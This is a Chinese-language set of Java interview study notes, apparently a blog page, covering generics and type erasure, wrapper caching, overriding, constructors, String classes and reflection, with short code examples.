<h4 id="Java泛型-什么是类型擦除-介绍一下常用的通配符"><a href="#Java泛型-什么是类型擦除-介绍一下常用的通配符" class="headerlink" title="Java泛型?什么是类型擦除? 介绍一下常用的通配符?"></a>Java泛型?什么是类型擦除? 介绍一下常用的通配符?</h4><p>Java 泛型（generics）是 JDK 5 中引入的一个新特性, 泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。泛型的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。</p>
<p>Java的泛型是伪泛型,这是因为java在编译期间,所有的泛型信息都会被擦掉,这也就是通常所说的类型擦除; 在运行期间通过反射创建对象就可以任意添加其他类型的对象;</p>
<p>Java编译器会在编译时尽可能的发现可能出错的地方，但是仍然无法在运行时刻出现的类型转换异常的情况，类型擦除也是Java的泛型与C++模板机制实现方式之间的重要区别。</p>
<p>类型检查就是针对引用的，谁是一个引用，用这个引用调用泛型方法，就会对这个引用调用的方法进行类型检测，而无关它真正引用的对象。</p>
<p><a href="https://www.cnblogs.com/wuqinglong/p/9456193.html">《Java 泛型类型擦除以及类型擦除带来的问题》</a></p>
<p><strong>原始类型</strong> 就是擦除去了泛型信息，最后在字节码中的类型变量的真正类型，无论何时定义一个泛型，相应的原始类型都会被自动提供，类型变量擦除，并使用其限定类型（无限定的变量用Object）替换。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span>&lt;T&gt; &#123;  </span><br><span class="line">    <span class="keyword">private</span> T value;  </span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getValue</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(T  value)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.value = value;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// pair的原始类型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> Object value;  </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object  value)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.value = value;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Pair如果这样声明的话,那么原始类型就是Comparable</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pair</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&gt; &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>在调用泛型方法时，可以指定泛型，也可以不指定泛型。</p>
<ul>
<li>在不指定泛型的情况下，泛型变量的类型为该方法中的几种类型的同一父类的最小级，直到Object</li>
<li>在指定泛型的情况下，该方法的几种类型必须是该泛型的实例的类型或者其子类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="comment">/**不指定泛型的时候*/</span>  </span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">//这两个参数都是Integer，所以T为Integer类型  </span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">f</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="number">1.2</span>); <span class="comment">//这两个参数一个是Integer，以风格是Float，所以取同一父类的最小级，为Number  </span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="string">&quot;asd&quot;</span>); <span class="comment">//这两个参数一个是Integer，以风格是Float，所以取同一父类的最小级，为Object  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**指定泛型的时候*/</span>  </span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">//指定了Integer，所以只能为Integer类型或者其子类  </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>, <span class="number">2.2</span>); <span class="comment">//编译错误，指定了Integer，不能为Float  </span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">c</span> <span class="operator">=</span> Test.&lt;Number&gt;add(<span class="number">1</span>, <span class="number">2.2</span>); <span class="comment">//指定为Number，所以可以为Integer和Float  </span></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">//这是一个简单的泛型方法  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">add</span><span class="params">(T x,T y)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> y;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为类型检查就是编译时完成的，new ArrayList()只是在内存中开辟了一个存储空间，可以存储任何类型对象，而真正设计类型检查的是它的引用，因为我们是使用它引用list1来调用它的方法，比如说调用add方法，所以list1引用能完成泛型类型的检查。而引用list2没有使用泛型，所以不行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(); <span class="comment">//可以实现与完全使用泛型参数一样的效果</span></span><br><span class="line"><span class="type">ArrayList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(); <span class="comment">//没有效果,会有编译时警告</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;().add(<span class="string">&quot;11&quot;</span>); <span class="comment">//编译通过  </span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;().add(<span class="number">22</span>);   <span class="comment">//编译错误  </span></span><br></pre></td></tr></table></figure>

<h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><ul>
<li>？ 表示不确定的 java 类型</li>
<li>T (type) 表示具体的一个 java 类型</li>
<li>K V (key value) 分别代表 java 键值中的Key Value</li>
<li>E (element) 代表 Element</li>
</ul>
<p>更多关于 Java 泛型中的通配符可以查看这篇文章：<a href="https://juejin.im/post/5d5789d26fb9a06ad0056bd9">《聊一聊-JAVA 泛型中的通配符 T，E，K，V，？》</a></p>
<p>？和 T 都表示不确定的类型，区别在于我们可以对 T 进行操作，但是对 ？ 不行，比如如下这种 ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以</span></span><br><span class="line"><span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> operate();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不可以</span></span><br><span class="line">？ car = operate();</span><br></pre></td></tr></table></figure>

<p>区别1：通过T来确保泛型参数的一致性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过 T 来 确保 泛型参数的一致性</span></span><br><span class="line"><span class="keyword">public</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt; <span class="keyword">void</span></span><br><span class="line"><span class="title function_">test</span><span class="params">(List&lt;T&gt; dest, List&lt;T&gt; src)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通配符是 不确定的，所以这个方法不能保证两个 List 具有相同的元素类型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span></span><br><span class="line"><span class="title function_">test</span><span class="params">(List&lt;? extends Number&gt; dest, List&lt;? extends Number&gt; src)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>区别2：类型参数可以多重限定而通配符不行</p>
<p>区别3：通配符可以使用超类限定而类型参数不行</p>
<p>类型参数 T 只具有 一种 类型限定方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T extends A</span><br></pre></td></tr></table></figure>

<p>但是通配符 ? 可以进行 两种限定：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">? extends A</span><br><span class="line">? super A</span><br></pre></td></tr></table></figure>

<h4 id="x3D-x3D-和-equals-的区别"><a href="#x3D-x3D-和-equals-的区别" class="headerlink" title="&#x3D;&#x3D; 和 equals 的区别"></a>&#x3D;&#x3D; 和 equals 的区别</h4><p>string方法的equals重写过了</p>
<h4 id="hashcode-与-equals"><a href="#hashcode-与-equals" class="headerlink" title="hashcode() 与 equals()"></a>hashcode() 与 equals()</h4><p>hashcode() 的作用是获取哈希码，也称为散列码；它实际上是返回一个 int 整数。这个哈希码的作用是确定该对象在哈希表中的索引位置。hashCode()定义在 JDK 的 Object 类中，这就意味着 Java 中的任何类都包含有 hashCode() 函数。另外需要注意的是： Object 的 hashcode 方法是本地方法，也就是用 c 语言或 c++ 实现的，该方法通常用来将对象的 内存地址 转换为整数之后返回。</p>
<p>当你把对象加入 HashSet 时，HashSet 会先计算对象的 hashcode 值来判断对象加入的位置，同时也会与其他已经加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用 equals() 方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet就不会让其加入操作成功。如果不同的话，就会重新散列到其他位置。</p>
<p>如果两个对象相等，则 hashcode 一定也是相同的。两个对象相等,对两个对象分别调用 equals 方法都返回 true。但是，两个对象有相同的 hashcode 值，它们也不一定是相等的 。因此，equals 方法被覆盖过，则 hashCode 方法也必须被覆盖。</p>
<blockquote>
<p>hashCode()的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）</p>
</blockquote>
<h4 id="八种基本类型、包装类、常量池"><a href="#八种基本类型、包装类、常量池" class="headerlink" title="八种基本类型、包装类、常量池"></a>八种基本类型、包装类、常量池</h4><p>byte, char, short, int, long, float, double, boolean</p>
<p>1,2,2,4,8,4,8, 未定义</p>
<p>Byte, Character, Short, Integer, Long, Float, Double, Boolean</p>
<p>Java 里使用 long 类型的数据一定要在数值后面加上 <strong>L</strong>，否则将作为整型解析</p>
<p>Java 基本类型的包装类的大部分都实现了常量池技术，即 Byte,Short,Integer,Long:默认创建了数值[-128，127] 的相应类型的缓存数据，Character 创建了数值在[0,127]范围的缓存数据，Boolean 直接返回 True Or False</p>
<p><strong>Integer一个例子:</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">40</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">40</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">40</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">40</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;i1=i2   &quot;</span> + (i1 == i2));</span><br><span class="line">System.out.println(<span class="string">&quot;i1=i2+i3   &quot;</span> + (i1 == i2 + i3));</span><br><span class="line">System.out.println(<span class="string">&quot;i1=i4   &quot;</span> + (i1 == i4));</span><br><span class="line">System.out.println(<span class="string">&quot;i4=i5   &quot;</span> + (i4 == i5));</span><br><span class="line">System.out.println(<span class="string">&quot;i4=i5+i6   &quot;</span> + (i4 == i5 + i6));</span><br><span class="line">System.out.println(<span class="string">&quot;40=i5+i6   &quot;</span> + (<span class="number">40</span> == i5 + i6));</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i1=i2   true</span><br><span class="line">i1=i2+i3   true</span><br><span class="line">i1=i4   false</span><br><span class="line">i4=i5   false</span><br><span class="line">i4=i5+i6   true</span><br><span class="line">40=i5+i6   true</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p>语句 i4 &#x3D;&#x3D; i5 + i6，因为+这个操作符不适用于 Integer 对象，首先 i5 和 i6 进行自动拆箱操作，进行数值相加，即 i4 &#x3D;&#x3D; 40。然后 Integer 对象无法与数值进行直接比较，所以 i4 自动拆箱转为 int 值 40，最终这条语句转为 40 &#x3D;&#x3D; 40 进行数值比较。</p>
<h4 id="Java值传递"><a href="#Java值传递" class="headerlink" title="Java值传递?"></a>Java值传递?</h4><p>Java 程序设计语言总是采用按值调用。也就是说，方法得到的是所有参数值的一个拷贝，也就是说，方法不能修改传递给它的任何参数变量的内容。</p>
<h4 id="重载和重写的区别"><a href="#重载和重写的区别" class="headerlink" title="重载和重写的区别"></a>重载和重写的区别</h4><p>重写发生在运行期，是子类对父类的允许访问的方法的实现过程进行重新编写。</p>
<ol>
<li>返回值类型、方法名、参数列表必须相同，抛出的异常范围小于等于父类，访问修饰符范围大于等于父类。</li>
<li>如果父类方法访问修饰符为 private&#x2F;final&#x2F;static 则子类就不能重写该方法，但是被 static 修饰的方法能够被再次声明。</li>
<li>构造方法无法被重写</li>
</ol>
<p>综上：重写就是子类对父类方法的重新改造，外部样子不能改变，内部逻辑可以改变</p>
<table>
<thead>
<tr>
<th>区别点</th>
<th>重载方法</th>
<th>重写方法</th>
</tr>
</thead>
<tbody><tr>
<td>发生范围</td>
<td>同一个类</td>
<td>子类</td>
</tr>
<tr>
<td>参数列表</td>
<td><strong>必须修改</strong></td>
<td>一定不能修改</td>
</tr>
<tr>
<td>返回类型</td>
<td>可修改</td>
<td>子类方法返回值类型应比父类方法返回值类型更小或相等</td>
</tr>
<tr>
<td>异常</td>
<td>可修改</td>
<td>子类方法声明抛出的异常类应比父类方法声明抛出的异常类更小或相等；</td>
</tr>
<tr>
<td>访问修饰符</td>
<td>可修改</td>
<td>一定不能做更严格的限制（可以降低限制）</td>
</tr>
<tr>
<td>发生阶段</td>
<td>编译期</td>
<td>运行期</td>
</tr>
</tbody></table>
<p><strong>方法的重写要遵循“两同两小一大”</strong></p>
<ul>
<li>“两同”即方法名相同、形参列表相同；</li>
<li>“两小”指的是子类方法返回值类型应比父类方法返回值类型更小或相等，子类方法声明抛出的异常类应比父类方法声明抛出的异常类更小或相等；</li>
<li>“一大”指的是子类方法的访问权限应比父类方法的访问权限更大或相等。</li>
</ul>
<p>⭐️ <strong>重写的返回值类</strong>型：如果方法的返回类型是void和基本数据类型，则返回值重写时不可修改。但是如果方法的返回值是引用类型，重写时是可以返回该引用类型的子类的。</p>
<h4 id="面向对象和面向过程的区别"><a href="#面向对象和面向过程的区别" class="headerlink" title="面向对象和面向过程的区别"></a>面向对象和面向过程的区别</h4><ul>
<li>面向过程 ：性能高。 因为类调用时需要实例化，开销比较大，比较消耗资源，所以当性能是最重要的考量因素的时候，比如单片机、嵌入式开发、Linux&#x2F;Unix 等一般采用面向过程开发。但是，面向过程没有面向对象易维护、易复用、易扩展。</li>
<li>面向对象 ：易维护、易复用、易扩展。 因为面向对象有封装、继承、多态性的特性，所以可以设计出低耦合的系统，使系统更加灵活、更加易于维护。但是，面向对象性能比面向过程低。</li>
</ul>
<h4 id="构造器是否可被重写"><a href="#构造器是否可被重写" class="headerlink" title="构造器是否可被重写?"></a>构造器是否可被重写?</h4><p>Constructor 不能被 override（重写）,但是可以 overload（重载）,所以你可以看到一个类中有多个构造函数的情况。</p>
<h4 id="在java中定义一个不做事且没有参数的构造方法的作用"><a href="#在java中定义一个不做事且没有参数的构造方法的作用" class="headerlink" title="在java中定义一个不做事且没有参数的构造方法的作用"></a>在java中定义一个不做事且没有参数的构造方法的作用</h4><p>Java 程序在执行子类的构造方法之前，如果没有用 super()来调用父类特定的构造方法，则会调用父类中“没有参数的构造方法”。因此，如果父类中只定义了有参数的构造方法，而在子类的构造方法中又没有用 super()来调用父类中特定的构造方法，则编译时将发生错误，因为 Java 程序在父类中找不到没有参数的构造方法可供执行。解决办法是在父类里加上一个不做事且没有参数的构造方法。帮助子类做初始化工作。</p>
<p>如果在类中你提供了其他有参的构造器，则编译器不会提供默认的无参构造器。</p>
<p>如果在类中你没有提供任何构造器，则编译器会提供一个默认的无参构造器。</p>
<p>如果你提供了一个构造器，你无须手动添加super()到你的构造器，编译器会默认添加。</p>
<p>如果父类未提供无参构造器，且子类没有使用super()调用父类有参构造的话编译器会报错; </p>
<p>如果构造器中添加了this引用该类的其他构造器，或者添加了super()调用父类构造器，this和super必须在构造器第一行，this引用其他构造器和super()语句不会同时出现</p>
<h4 id="一个类的构造方法的作用是什么-若一个类没有声明构造方法，该程序能正确执行吗-为什么"><a href="#一个类的构造方法的作用是什么-若一个类没有声明构造方法，该程序能正确执行吗-为什么" class="headerlink" title="一个类的构造方法的作用是什么? 若一个类没有声明构造方法，该程序能正确执行吗? 为什么?"></a>一个类的构造方法的作用是什么? 若一个类没有声明构造方法，该程序能正确执行吗? 为什么?</h4><p>主要作用是完成对类对象的初始化工作。</p>
<p>可以执行。因为一个类即使没有声明构造方法也会有默认的不带参数的构造方法。如果我们自己添加了类的构造方法（无论是否有参），Java 就不会再添加默认的无参数的构造方法了，这时候，就不能直接 new 一个对象而不传递参数了，所以我们一直在不知不觉地使用构造方法，这也是为什么我们在创建对象的时候后面要加一个括号（因为要调用无参的构造方法）。如果我们重载了有参的构造方法，记得都要把无参的构造方法也写出来（无论是否用到），因为这可以帮助我们在创建对象的时候少踩坑。</p>
<p>构造方法:</p>
<ol>
<li>名字与类名相同。</li>
<li>没有返回值，但不能用 void 声明构造函数。</li>
<li>生成类的对象时自动执行，无需调用。</li>
</ol>
<h4 id="成员变量和局部变量"><a href="#成员变量和局部变量" class="headerlink" title="成员变量和局部变量"></a>成员变量和局部变量</h4><ol>
<li><p>语法形式上: 成员变量是属于类的，而局部变量是在代码块或方法中定义的变量或是方法的参数；成员变量可以被 public,private,static 等修饰符所修饰，而局部变量不能被访问控制修饰符及 static 所修饰；但是，成员变量和局部变量都能被 final 所修饰。</p>
</li>
<li><p>从变量在内存中的存储方式来看: 如果成员变量是使用static修饰的，那么这个成员变量是属于类的，如果没有使用static修饰，这个成员变量是属于实例的。而对象存在于堆内存，局部变量则存在于栈内存。</p>
</li>
<li><p>从变量在内存中的生存时间上看:成员变量是对象的一部分，它随着对象的创建而存在，而局部变量随着方法的调用而自动消失。</p>
</li>
<li><p>成员变量如果没有被赋初值:则会自动以类型的默认值而赋值（一种情况例外:被 final 修饰的成员变量也必须显式地赋值），而局部变量则不会自动赋值</p>
</li>
<li><p>成员变量（全局变量）是可以不经初始化的，在类加载过程的准备阶段即可给它赋予默认值，但局部变量使用前需要显示赋予初始值，javac不是推断不出不可以这样做，而是没有这么做，对于成员变量而言，其赋值和取值访问的先后顺序具有不确定性，对于成员变量可以在一个方法调用前赋值，也可以在方法调用后进行，这是运行时发生的，编译器确定不了，交给jvm去做比较合适。</p>
</li>
<li><p>而对于局部变量而言，其赋值和取值访问顺序是确定的。这样设计是一种约束，尽最大程度减少使用者犯错的可能。假使局部变量可以使用默认值，可能总会无意间忘记赋值，进而导致不可预期的情况出现。</p>
</li>
</ol>
<h4 id="面向对象的三大特征"><a href="#面向对象的三大特征" class="headerlink" title="面向对象的三大特征"></a>面向对象的三大特征</h4><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>封装是指把一个对象的状态信息（也就是属性）隐藏在对象内部，不允许外部对象直接访问对象的内部信息。但是可以提供一些可以被外界访问的方法来操作属性。就好像我们看不到挂在墙上的空调的内部的零件信息（也就是属性），但是可以通过遥控器（方法）来控制空调。如果属性不想被外界访问，我们大可不必提供方法给外界访问。但是如果一个类没有提供给外界访问的方法，那么这个类也没有什么意义了。就好像如果没有空调遥控器，那么我们就无法操控空凋制冷，空调本身就没有意义了（当然现在还有很多其他方法 ，这里只是为了举例子）。</p>
<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>不同类型的对象，相互之间经常有一定数量的共同点。例如，小明同学、小红同学、小李同学，都共享学生的特性（班级、学号等）。同时，每一个对象还定义了额外的特性使得他们与众不同。例如小明的数学比较好，小红的性格惹人喜爱；小李的力气比较大。继承是使用已存在的类的定义作为基础建立新类的技术，新类的定义可以增加新的数据或新的功能，也可以用父类的功能，但不能选择性地继承父类。通过使用继承，可以快速地创建新的类，可以提高代码的重用，程序的可维护性，节省大量创建新类的时间 ，提高我们的开发效率。</p>
<p><strong>关于继承如下 3 点请记住：</strong></p>
<ol>
<li>子类拥有父类对象所有的属性和方法（包括私有属性和私有方法），但是父类中的私有属性和私有方法子类是无法访问，<strong>只是拥有</strong>。</li>
<li>子类可以拥有自己属性和方法，即子类可以对父类进行扩展。</li>
<li>子类可以用自己的方式实现父类的方法。（以后介绍）。</li>
</ol>
<h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p>多态，顾名思义，表示一个对象具有多种的状态。具体表现为父类的引用指向子类的实例。</p>
<p>多态分为编译时多态和运行时多态。其中编译时多态是静态的，主要是指方法的重载，它是根据参数列表的不同来区分不同的函数，通过编辑之后会变成两个不同的函数，在运行时谈不上多态。而运行时多态是动态的，它是通过动态绑定来实现的，也就是我们所说的多态性。</p>
<p><strong>多态的特点:</strong></p>
<ul>
<li>对象类型和引用类型之间具有继承（类）&#x2F;实现（接口）的关系；</li>
<li>引用类型变量发出的方法调用的到底是哪个类中的方法，必须在程序运行期间才能确定；</li>
<li>多态不能调用“只在子类存在但在父类不存在”的方法；</li>
<li>如果子类重写了父类的方法，真正执行的是子类覆盖的方法，如果子类没有覆盖父类的方法，执行的是父类的方法。</li>
</ul>
<h4 id="在一个静态方法内调用一个非静态成员为什么是非法的"><a href="#在一个静态方法内调用一个非静态成员为什么是非法的" class="headerlink" title="在一个静态方法内调用一个非静态成员为什么是非法的"></a>在一个静态方法内调用一个非静态成员为什么是非法的</h4><p>类的静态成员(变量或方法)属于类本身，在类加载的时候就会分配内存，可以通过类名直接访问<br>非静态成员(变量或方法)属于类的对象，只有在类的对象产生(实例化)时才会分配内存，然后通过类的对象(实例)去访问<br>所以，如果一个类的静态方法去调用非静态方法或变量的时候，因为类的静态方法存在的时候，类的非静态成员可能不存在，访问一个内存中不存在的东西当然会出错</p>
<h4 id="String-StringBuffer-和-StringBuilder"><a href="#String-StringBuffer-和-StringBuilder" class="headerlink" title="String StringBuffer 和 StringBuilder"></a>String StringBuffer 和 StringBuilder</h4><p>String s&#x3D;“This is only ”+”simple”+”test”会被虚拟机直接优化成String s&#x3D;“This is only simple test”</p>
<p>简单的来说：String 类中使用 final 关键字修饰字符数组来保存字符串，private final char value[]，所以String 对象是不可变的。</p>
<blockquote>
<p>在 Java 9 之后，String 、StringBuilder 与 StringBuffer 的实现改用 byte 数组存储字符串 private final byte[] value</p>
</blockquote>
<p>而 StringBuilder 与 StringBuffer 都继承自 AbstractStringBuilder 类，在 AbstractStringBuilder 中也是使用字符数组保存字符串char[] value 但是没有用 final 关键字修饰，所以这两种对象都是可变的。</p>
<p>StringBuilder 与 StringBuffer 的构造方法都是调用父类构造方法也就是AbstractStringBuilder 实现的</p>
<p>String 中的对象是不可变的，也就可以理解为常量，线程安全。AbstractStringBuilder 是 StringBuilder 与 StringBuffer 的公共父类，定义了一些字符串的基本操作，如 expandCapacity、append、insert、indexOf 等公共方法。StringBuffer 对方法加了同步锁或者对调用的方法加了同步锁，所以是线程安全的。StringBuilder 并没有对方法进行加同步锁，所以是非线程安全的。</p>
<p>每次对 String 类型进行改变的时候，都会生成一个新的 String 对象，然后将指针指向新的 String 对象。StringBuffer 每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象并改变对象引用。相同情况下使用 StringBuilder 相比使用 StringBuffer 仅能获得 10%~15% 左右的性能提升，但却要冒多线程不安全的风险。</p>
<p>对于三者使用的总结：</p>
<ol>
<li>操作少量的数据: 适用 String</li>
<li>单线程操作字符串缓冲区下操作大量数据: 适用 StringBuilder</li>
<li>多线程操作字符串缓冲区下操作大量数据: 适用 StringBuffer</li>
</ol>
<h4 id="java序列化中如果有些字段不想进行序列化-怎么办"><a href="#java序列化中如果有些字段不想进行序列化-怎么办" class="headerlink" title="java序列化中如果有些字段不想进行序列化,怎么办?"></a>java序列化中如果有些字段不想进行序列化,怎么办?</h4><p>对于不想序列话的变量,使用transient关键字修饰</p>
<p>transient关键字的作用是:阻止实例中哪些用此关键字修饰的变量序列化;当对象被反序列化时,被transient修饰的变量值不会被持久化和恢复; transient只能修饰变量,不能修饰类和方法.</p>
<h4 id="获取键盘输入的常用方法"><a href="#获取键盘输入的常用方法" class="headerlink" title="获取键盘输入的常用方法"></a>获取键盘输入的常用方法</h4><p>方法一:通过scanner</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> input.nextLine();</span><br><span class="line">input.close();</span><br></pre></td></tr></table></figure>

<p>方法二: 通过BufferedReader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> input.readLine();</span><br></pre></td></tr></table></figure>

<h4 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h4><p>JAVA 反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为 java 语言的反射机制。</p>
<p>一个类在内存中只有一个class对象, 一个类被加载后,类的整个结构都会封装在class对象中</p>
<h4 id="静态编译和动态编译"><a href="#静态编译和动态编译" class="headerlink" title="静态编译和动态编译"></a>静态编译和动态编译</h4><p>在编译时确定对象,绑定对象;</p>
<p>运行时确定对象,绑定对象;</p>
<h4 id="反射机制优缺点"><a href="#反射机制优缺点" class="headerlink" title="反射机制优缺点"></a>反射机制优缺点</h4><p>优点: 运行期类型的判断,动态加载类,提高代码灵活度</p>
<p>缺点: </p>
<p>1.性能瓶颈:反射相当于一系列解释操作,通知jvm要做的事情,性能比直接java代码要慢很多.</p>
<p>2.安全问题: 让我们可以动态操作改变类属性的同时也增加了类的安全隐患.</p>
<p>反射修改string值,因为final是编译期关键字,只在编译期进行检查.</p>
<h4 id="反射的应用场景"><a href="#反射的应用场景" class="headerlink" title="反射的应用场景"></a>反射的应用场景</h4><p>在我们平时的项目开发过程中，基本上很少会直接使用到反射机制，但这不能说明反射机制没有用，实际上有很多设计、开发都与反射机制有关，例如模块化的开发，通过反射去调用对应的字节码；动态代理设计模式也采用了反射机制，还有我们日常使用的 Spring／Hibernate 等框架也大量使用到了反射机制。</p>
<p>举例：</p>
<ol>
<li>我们在使用 JDBC 连接数据库时使用 Class.forName()通过反射加载数据库的驱动程序；</li>
<li>Spring 框架的 IOC（动态加载管理 Bean）创建对象以及 AOP（动态代理）功能都和反射有联系；</li>
<li>动态配置实例的属性；</li>
</ol>
<h4 id="获取class对象的4种方式"><a href="#获取class对象的4种方式" class="headerlink" title="获取class对象的4种方式"></a>获取class对象的4种方式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过此方法获取Class对象不会进行初始化</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">string</span> <span class="operator">=</span> String.class;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Class.forName(className)方法，内部实际调用的是一个native方法 forName0(className, true, ClassLoader.getClassLoader(caller), caller);</span></span><br><span class="line"><span class="comment">//第2个boolean参数表示类是否需要初始化，Class.forName(className)默认是需要初始化。</span></span><br><span class="line"><span class="comment">//一旦初始化，就会触发目标对象的 static块代码执行，static参数也会被再次初始化。</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">alunbarClass1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;cn.javaguide.TargetObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过对象获取</span></span><br><span class="line"><span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">alunbarClass2</span> <span class="operator">=</span> e.getClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这种方式加载的不会初始化</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class&lt;?&gt; aClass1 = systemClassLoader.loadClass(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本内置类型的包装类都有一个Type属性</span></span><br><span 